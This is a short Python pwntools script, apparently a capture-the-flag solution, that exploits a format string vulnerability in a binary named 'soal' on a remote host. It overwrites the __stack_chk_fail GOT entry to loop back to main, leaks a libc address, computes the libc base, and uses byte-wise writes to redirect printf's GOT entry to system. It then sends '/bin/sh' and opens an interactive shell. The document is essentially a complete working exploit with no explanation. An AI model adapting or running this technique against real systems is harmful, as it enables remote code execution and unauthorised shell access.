from pwn import *

exe = ELF("./soal", checksec=False)


# r = process('./soal')
# l = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so", checksec=False)

# r = remote("localhost", 13307)
r = remote("104.248.150.36",13303)
l = ELF("libc-2.31.so", checksec=False)



main=0x0000000000401204
# gdb.attach(r,'''
# 	b *0x401244
# 	b *0x401291
# 	c
# 	ni
# 	''')
r.sendlineafter("Name : ", 'a')

p = "%4611x %19$hn-%25$p".ljust(72, '\x00')
p += p64(exe.got['__stack_chk_fail'])
p = p.ljust(105, 'a')

r.sendafter("Note : ", p)

leak = r.recvuntil('Name',drop="Name").split('-')

print("leak :", leak[-1])
leak = int(leak[-1], 16)
l.address = leak - l.sym['__libc_start_main'] - 234 - 9
print("Base libc :", hex(l.address))
sys = l.symbols['system']
offset = []
for i in range(3):
   tmp = sys & 0xff
   offset.append(tmp)
   sys >>= 8

p = '%{}x%19$hhn'.format(offset[0])
p += '%{}x%20$hhn'.format(offset[1]-offset[0]+0x100)
p += '%{}x%21$hhn'.format(offset[2]-offset[1]+0x100)
p = p.ljust(72, '\x00')
p += p64(exe.got['printf'])
p += p64(exe.got['printf']+1)
p += p64(exe.got['printf']+2)
p = p.ljust(105, 'a')

r.sendline('a')
r.sendafter("Note : ", p)

r.sendline('junk')
r.sendline('/bin/sh')

r.interactive()
